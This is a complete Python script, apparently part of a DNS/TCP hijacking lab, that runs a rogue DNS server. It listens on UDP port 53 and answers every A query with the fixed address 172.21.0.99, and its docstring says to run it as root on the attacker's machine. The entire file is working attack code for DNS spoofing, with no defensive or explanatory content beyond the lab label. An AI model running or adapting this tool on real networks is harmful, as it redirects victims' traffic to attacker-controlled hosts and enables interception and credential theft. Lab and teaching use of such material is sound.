#!/usr/bin/env python3
"""Minimal rogue DNS server used by the dns-tcp-hijack lab.

Answers every A query with 172.21.0.99.  Run it on the attacker as root:

    sudo python3 fake-dns.py
"""

import socket
import struct

ANSWER = '172.21.0.99'


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', 53))
    print('rogue DNS listening on udp/53, answering A %s' % ANSWER, flush=True)
    while True:
        data, addr = sock.recvfrom(512)
        if len(data) < 12:
            continue
        i = 12
        while i < len(data) and data[i] != 0:
            i += 1 + data[i]
        i += 1
        question = data[12:i + 4]
        tid = data[:2]
        header = tid + b'\x81\x80' + b'\x00\x01\x00\x01\x00\x00\x00\x00'
        answer = (b'\xc0\x0c' + b'\x00\x01\x00\x01'
                  + struct.pack('!I', 60) + b'\x00\x04'
                  + socket.inet_aton(ANSWER))
        sock.sendto(header + question + answer, addr)


if __name__ == '__main__':
    main()
